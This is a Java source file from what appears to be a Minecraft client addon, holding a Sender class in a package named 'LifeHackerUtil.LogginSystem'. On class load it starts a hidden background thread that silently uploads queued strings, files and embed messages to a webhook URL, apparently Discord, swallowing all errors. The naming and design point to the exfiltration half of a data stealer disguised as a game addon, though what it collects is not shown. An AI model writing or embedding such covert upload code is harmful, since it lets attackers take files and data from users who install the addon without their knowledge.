package genesis.team.addon.util.LifeHackerUtil.LogginSystem.Utils;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import genesis.team.addon.Genesis;
import okhttp3.*;
import okhttp3.MultipartBody.Builder;

import java.io.File;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayDeque;
import java.util.Optional;
import java.util.Queue;

public final class Sender {
    private static Sender INSTANCE;
    private final Queue<Object> queue = new ArrayDeque();

    private Sender() throws MalformedURLException {
        URL url = new URL(Genesis.webhook);

        new Thread(() -> {
            for (; ; ) {
                try {
                    Thread.sleep(3500);
                    if (queue.isEmpty()) continue;
                    Object item = queue.poll();
                    OkHttpClient client = new OkHttpClient();
                    Builder builder = new Builder().setType(MultipartBody.FORM);
                    if (item instanceof String)
                        builder.addFormDataPart("payload_json", "{\"content\":\"" + item + "\"}");
                    else if (item instanceof File)
                        builder.addFormDataPart("file1", ((File) item).getName(), RequestBody.create(MediaType.parse("application/octet-stream"), (File) item));
                    else if (item instanceof Message) {
                        JsonObject obj = new JsonObject();
                        obj.addProperty("title", ((Message) item).getName());
                        JsonArray embeds = new JsonArray();
                        JsonObject embed = new JsonObject();
                        JsonArray fields = new JsonArray();
                        ((Message) item).getFields().forEach(field -> {
                            JsonObject f = new JsonObject();
                            f.addProperty("name", field.getName());
                            f.addProperty("value", field.getValue());
                            f.addProperty("inline", field.isInline());
                            fields.add(f);
                        });
                        embed.add("fields", fields);
                        embeds.add(embed);
                        obj.add("embeds", embeds);
                        builder.addFormDataPart("payload_json", obj.toString());
                    } else continue;
                    Request request = new Request.Builder().url(url).method("POST", builder.build()).build();
                    client.newCall(request).execute().body().close();
                } catch (Exception ignored) {
                }
            }
        }).start();
    }

    public static Optional<File> getFile(String name) {
        return Optional.of(new File(name));
    }

    public static String randomString() {
        String AlphaNumericString = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvxyz";
        StringBuilder sb = new StringBuilder(20);
        for (int i = 0; i < 20; i++) {
            int index = (int) (AlphaNumericString.length() * Math.random());
            sb.append(AlphaNumericString.charAt(index));
        }
        return sb.toString();
    }

    public static void send(Object string) {
        INSTANCE.queue.add(string);
    }

    static {
        try {
            INSTANCE = new Sender();
        } catch (MalformedURLException var1) {
            var1.printStackTrace();
        }
    }
}
